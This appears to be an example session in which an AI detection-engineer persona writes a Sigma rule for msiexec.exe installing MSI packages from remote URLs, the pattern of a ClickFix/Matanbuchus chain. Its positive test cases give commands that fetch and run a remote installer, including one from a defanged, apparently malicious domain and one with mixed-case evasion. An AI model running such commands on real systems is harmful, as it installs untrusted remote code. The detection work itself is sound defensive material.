# Detection Engineer Persona — Example Session

## Command

```
claude --append-system-prompt-file ~/.claude/personas/detection-engineer.md
```

## Question

Write me a Sigma rule to detect msiexec.exe installing from a URL,
which is the Matanbuchus pattern we saw in the purple team exercise in E:\ClaudeWork\purple-team

## Output

Found the exercise context — this is the ClickFix → Matanbuchus 3.0 → AstarionRAT chain (Huntress, Feb 2026) documented in `E:\ClaudeWork\purple-team\exercises\2026-08-04\threat-intel.md`. The pattern: `msiexec.exe` invoked with a remote `http(s)://` MSI source, either as a direct `/i` argument or a `PACKAGE=` property, sometimes with mixed-case binary name evasion (`mSiexeC.EXe`).

**Rule:**
```yaml
title: Msiexec Installing Package from Remote URL (Matanbuchus/ClickFix Pattern)
id: 7e3a9f1c-6b2d-4e8a-9c1f-2d5b8a4e7f0d
status: experimental
description: >
    Detects msiexec.exe invoked with a remote http(s):// source for the MSI
    package, either as a direct /i argument or a PACKAGE= property. Observed
    in the ClickFix -> Matanbuchus 3.0 -> AstarionRAT chain (Huntress, Feb 2026),
    where a paste-and-run lure launches a silent remote MSI install.
references:
    - https://www.huntress.com/blog/clickfix-matanbuchus-astarionrat-analysis
author: detection-engineering
date: 2026-08-05
tags:
    - attack.execution
    - attack.t1218.007
    - attack.defense_evasion
logsource:
    category: process_creation
    product: windows
detection:
    selection_img:
        Image|endswith: '\msiexec.exe'
    selection_remote_source:
        CommandLine|re: '(?i)(/i\s+|PACKAGE\s*=\s*)["'']?https?://'
    condition: selection_img and selection_remote_source
falsepositives:
    - Legitimate software deployment tools (SCCM, Intune, custom deployment
      scripts) that push MSIs from an internal HTTP file server.
    - Some enterprise app packagers reference update MSIs hosted on internal
      or vendor CDN URLs as part of normal patch workflows.
level: high
```

**Logic (plain English):** Fire when `msiexec.exe` runs with a command line containing either `/i http(s)://...` or `PACKAGE=http(s)://...`, meaning it's pulling the installer package from a remote URL rather than a local/UNC path.

**ATT&CK:** T1218.007 / Defense Evasion (Signed Binary Proxy Execution: Msiexec)

**Positive test case:**
```
msiexec.exe /q /i http://binclloudapp[.]com/466943/test.msi
msiexec.exe /q PACKAGE=http://lab-web.internal/test.msi
mSiexeC.EXe /q PACKAGE=http://lab-web.internal/test.msi
```
All three trigger — the `Image|endswith` match is case-insensitive by default in Sigma, so the mixed-case evasion string (`mSiexeC.EXe`) from the ClickFix lure still matches.

**Negative test case:**
```
msiexec.exe /i C:\Windows\Temp\update.msi /q
msiexec.exe /i \\fileserver\share\deploy\app.msi /qn
```
Doesn't trigger — no `http(s)://` in the command line, so this reads as a normal local or UNC-path install (the common SCCM/Intune pattern).

**FP analysis:**
- **Scenario 1: Internal software deployment tooling.** SCCM, Intune, or a custom packager that stages MSIs on an internal web server and installs via `/i http://internal-repo/...`. Mitigation: add an allowlist filter on known internal deployment server IPs/hostnames (`CommandLine|re` excluding your `deploy.corp.local` or similar), or split the rule into two severities — internal-URL hits at `low`, external/unknown-URL hits stay at `high`.
- **Scenario 2: Legitimate vendor auto-updaters.** Some enterprise apps (rare, but exists) trigger MSI repair/update via a vendor CDN URL directly through msiexec rather than a bundled updater exe. Mitigation: allowlist known vendor CDN domains if this becomes a recurring noisy hit in your environment; otherwise treat any external-domain hit as noteworthy since it's uncommon.
- **Scenario 3: Purple team / pentest activity.** Your own atomic tests (per the test-plan.md in this exercise) will trigger this exact rule by design — expected during the exercise window, so timebox any tuning decisions to exclude the lab test window rather than permanently allowlisting the lab web server.

**Performance:** Scans `process_creation` events, filtered first by `Image` (cheap exact suffix match) before the regex runs — regex only evaluates against the reduced set of msiexec invocations, so cost is negligible even at high event volume (thousands of proc-creates/day per host is not exceptional).

**Tuning:**
- Add your internal deployment server hostnames/IPs to an exclusion filter (`CommandLine|re` NOT matching `internal-repo\.corp\.local`) to cut expected FPs from SCCM/Intune.
- If your EDR/Sysmon config doesn't capture full command lines (Sysmon EID 1 with `CommandLine` field, or Security 4688 with "Include command line in process creation events" enabled via GPO), **this rule will silently produce zero hits** — confirm that audit setting is on before relying on it.
- Consider adding a companion rule on child processes of `msiexec.exe` (per the intel doc's AV-DLL-sideload step) to catch the next stage even if this rule is tuned to exclude a legitimate-looking URL.
